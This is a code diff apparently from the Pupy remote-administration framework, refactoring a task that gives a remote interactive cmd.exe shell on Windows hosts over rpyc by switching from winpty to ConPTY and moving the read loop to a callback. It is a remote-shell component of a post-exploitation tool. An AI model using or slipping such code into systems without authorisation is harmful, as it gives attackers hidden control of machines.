@@ -3,7 +3,11 @@
 __all__ = ['acquire', 'release']
 
 import rpyc
-import winpty
+
+try:
+    from conpty import ConPTY as PTY
+except ImportError:
+    from winpty import WinPTY as PTY
 
 from collections import deque
 from pupy import manager, Task
@@ -43,7 +47,7 @@ class PtyShell(Task):
         if not self.pty:
             return
 
-        self.pty.resize(ws_row, ws_col)
+        self.pty.resize(ws_col, ws_row)
 
     def attach(self, read_cb, close_cb):
         if self.active:
@@ -67,11 +71,10 @@ class PtyShell(Task):
             argv = r'C:\windows\system32\cmd.exe'
 
         try:
-            self.pty = winpty.WinPTY(
+            self.pty = PTY(
                 argv, htoken=self.htoken)
 
-            if self.pty:
-                self._read_loop()
+            self.pty.read_loop(self._on_read_data)
 
         finally:
             try:
@@ -85,20 +88,17 @@ class PtyShell(Task):
             except:
                 pass
 
-    def _read_loop(self):
-        while self.active:
-            data = self.pty.read()
-            if not data:
-                break
+    def _on_read_data(self, data):
+        self._buffer.append(data)
 
-            self._buffer.append(data)
-
-            if self.read_cb:
-                self.read_cb(data)
+        if self.read_cb:
+            self.read_cb(data)
 
     def stop(self):
-        super(PtyShell, self).stop()
-        self.close()
+        try:
+            super(PtyShell, self).stop()
+        finally:
+            self.close()
 
     def close(self):
         if not self.pty:
